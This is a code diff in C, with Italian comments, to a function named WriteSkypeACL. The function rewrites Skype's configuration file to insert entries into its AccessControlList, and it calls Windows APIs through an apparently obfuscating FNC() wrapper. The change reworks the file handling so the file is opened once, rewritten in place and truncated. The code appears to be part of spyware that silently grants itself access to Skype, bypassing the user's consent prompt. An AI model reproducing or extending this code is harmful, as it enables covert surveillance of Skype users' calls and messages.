@@ -2005,7 +2005,7 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	DWORD dummy;
 
 	// Fa una copia del file in memoria
-	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
 		return FALSE;
 	
 	config_size = GetFileSize(hFile, NULL);
@@ -2036,7 +2036,6 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	memcpy(local_config_map, config_map, config_size);
 	FNC(UnmapViewOfFile)(config_map);
 	CloseHandle(hMap);
-	CloseHandle(hFile);
 	
 	// Vede se manca la sezione <AccessContrlList>
 	if (!(ptr = strstr(local_config_map, "</AccessControlList>"))) {
@@ -2045,13 +2044,13 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	}
 	if (!ptr) {
 		SAFE_FREE(local_config_map);
+		CloseHandle(hFile);
 		return FALSE;
 	}
-	// Apre il file in scrittura e ci scrive dentro...
-	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, TRUNCATE_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
-		SAFE_FREE(local_config_map);
-		return FALSE;
-	}
+
+	// Svuota il contenuto del file
+	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+
 	first_part_size = ptr - local_config_map;
 	WriteFile(hFile, local_config_map, first_part_size, &dummy, NULL);
 	if (acl_missing)
@@ -2075,6 +2074,7 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 		WriteFile(hFile, "</AccessControlList>\r\n", strlen("</AccessControlList>\r\n"), &dummy, NULL);
 	WriteFile(hFile, ptr, config_size - first_part_size, &dummy, NULL);
 
+	SetEndOfFile(hFile);
 	SAFE_FREE(local_config_map);
 	CloseHandle(hFile);
 	return TRUE;
